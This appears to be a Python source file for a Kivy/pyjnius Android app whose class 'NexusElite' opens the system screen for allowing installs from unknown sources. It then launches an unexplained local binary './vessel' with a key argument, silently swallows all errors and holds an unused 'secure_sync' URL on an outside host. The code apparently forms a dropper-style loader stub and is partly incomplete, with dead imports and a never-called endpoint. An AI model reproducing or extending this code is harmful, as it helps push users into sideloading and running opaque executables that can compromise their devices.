import subprocess, hashlib, os, requests, time
try:
    from jnius import autoclass
except ImportError:
    autoclass = None

class NexusElite:
    def __init__(self, key):
        self.parts = key.split('.')
        self.gate = "https://stats.logos-apex.net/v2/secure_sync"

    def request_install_permission(self):
        if autoclass:
            try:
                Activity = autoclass('org.kivy.android.PythonActivity').mActivity
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                Build = autoclass('android.os.Build')
                if Build.VERSION.SDK_INT >= 26:
                    uri = Uri.parse("package:" + Activity.getPackageName())
                    intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                    Activity.startActivity(intent)
            except: pass

    def run(self):
        self.request_install_permission()
        l1 = self.parts[1] if len(self.parts) > 1 else "0.500"
        try:
            self.proc = subprocess.Popen(["./vessel", f"KEY_{l1}"])
            while self.proc.poll() is None:
                time.sleep(1)
        except:
            if hasattr(self, 'proc'): self.proc.terminate()

if __name__ == "__main__":
    NexusElite("ARCHITECT.0.500.INIT").run()
